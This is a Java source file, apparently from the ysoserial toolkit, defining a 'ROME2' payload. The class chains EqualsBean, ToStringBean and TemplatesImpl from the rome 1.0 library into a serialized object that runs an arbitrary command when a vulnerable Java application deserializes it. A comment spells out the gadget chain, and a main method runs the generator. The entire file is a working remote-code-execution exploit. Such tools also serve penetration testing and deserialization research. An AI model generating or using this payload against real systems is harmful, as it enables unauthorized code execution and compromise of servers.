package ysoserial.payloads;

import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.xml.transform.Templates;

/*
HashMap#readobject()
EqualsBean#hash()
EqualsBean#hashcode()
ToStringBean#toString()
TemplatesImpl#getProperties()
....
TemplatesImpl#defineclass()
*/
@Dependencies("rome:rome:1.0")
@Authors({ Authors.F4NX1NG })
public class ROME2 implements ObjectPayload<Object> {

    public Object getObject ( String command ) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);
        ToStringBean delegate = new ToStringBean(Templates.class, o);
        EqualsBean root  = new EqualsBean(ToStringBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(ROME2.class, args);
    }

}
